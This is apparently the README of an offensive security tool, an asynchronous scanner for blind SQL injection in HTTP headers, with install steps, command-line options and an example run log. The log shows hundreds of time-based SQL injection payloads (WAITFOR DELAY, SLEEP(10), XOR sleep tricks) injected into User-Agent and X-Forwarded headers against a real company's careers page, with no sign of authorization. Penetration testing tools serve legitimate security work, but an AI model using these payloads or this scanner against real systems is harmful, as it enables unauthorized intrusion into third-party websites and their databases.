
# Asynchronous Vulnerability Scanner

---

## Description
### Program to find blind SQLi in headers
Based on [SqliSniper](https://github.com/highchoice/SqliSniperPLUS/tree/main)

---

## Install:
```pycon
git clone 
cd AVScaner_Form
```
```pycon
1. Create a virtual environment:
    python -m venv .venv

2. Activate the virtual environment:
    On Windows:
    .venv\Scripts\activate
    
    On macOS/Linux:
    source .venv/bin/activate

pip install -r requirements.txt
# pip freeze > requirements.txt
```

---

## Preparing links before work:
### Tools:
- [uddup](https://github.com/rotemreiss/uddup)
- [p1radup](https://github.com/iambouali/p1radup)
- [urldedupe](https://github.com/ameenmaali/urldedupe)

```bash
uddup -s -u after_crawled_link.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | sort -u | urldedupe -s > crawled_final.txt
```

---

### Use:
```text
"-i", "--input", help="Path to the file with links for check"
"-o", "--output", help="Output folder", default="output_report"
"-p", "--payloads", help="Path to file with payloads"
"-c", "--concurrency", help="Number of concurrent requests per sec", default=10)
"-t", "--timeout", help="Request timeout", default=45 sec)
"-px", "--proxy", help="Proxy for intercepting requests (e.g., http://127.0.0.1:8080)"
```
```pycon
python AVScaner_SQLi_Header.py -c 2 -px http://127.0.0.1:8080

python AVScaner_Form.py -c 10 --proxy http://127.0.0.1:8080

python AVScaner_Form.py -c 10 -i "input_data/crawled_final.txt" -p "wordlist/payloads_BSQLi.txt" 
```

### After scanning, check the **output_report** folder!

---

### Example

```bash
 python AVScaner_SQLi_Header.py -c 10

[*] Starting @ 13:40:21 2024-09-06
[*] Total number of payload variants per link: 97



Test URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 200 | Response time: 2.64sec
[*] Total number of payload options per link including header: 4365

[1] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.04 sec | Header: {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"));waitfor delay \'10\'--', 'X-Forwarded-For': '127.0.0.1:80'}
[2] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.07 sec | Header: {'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36%' WAITFOR DELAY '10'--", 'X-Remote-IP': '127.0.0.1'}
[3] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.08 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36pg_SLEEP(10)', 'X-Forwarded-Port': '8080'}

[823] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.03 sec | Header: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.01 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc', 'X-Forwarded-Host': 'http://127.0.0.1'}
[824] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.04 sec | Header: {'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36%' WAITFOR DELAY '10'--", 'X-Forwarded-Proto': 'http://127.0.0.1'}
[825] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 200 | Response time: 4.06 sec | Header: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'X-WAP-Profile': '127.0.0.1sleep(10)#'}
[826] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.04 sec | Header: {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'XOR(if(now()=sysdate(),sleep(10*1),0))OR'", 'X-Forwarded-Host': 'http://127.0.0.1'}
[827] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.04 sec | Header: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"0\'XOR(if(now()=sysdate(),sleep((10-1),0))XOR\'Z"', 'X-Forwarded-For': '127.0.0.1:80'}
[828] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 403 | Response time: 0.04 sec | Header: {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Originally-Forwarded-For': "127.0.0.1and WAITFOR DELAY '10'--"}
[829] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 200 | Response time: 3.52 sec | Header: {'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36waitfor delay '10'", 'X-Forwarded-Proto': 'http://127.0.0.1'}
[830] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 200 | Response time: 3.56 sec | Header: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'X-WAP-Profile': '127.0.0.1&&SLEEP(10)'}
[831] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 200 | Response time: 4.03 sec | Header: {'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36waitfor delay '10'#", 'X-Forwarded-Proto': 'http://127.0.0.1'}
[832] URL: https://www.anthropic.com/careers?_rsc=10d0v | Status: 200 | Response time: 4.03 sec | Header: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'X-WAP-Profile': '127.0.0.1&&SLEEP(10)#'}
```



---
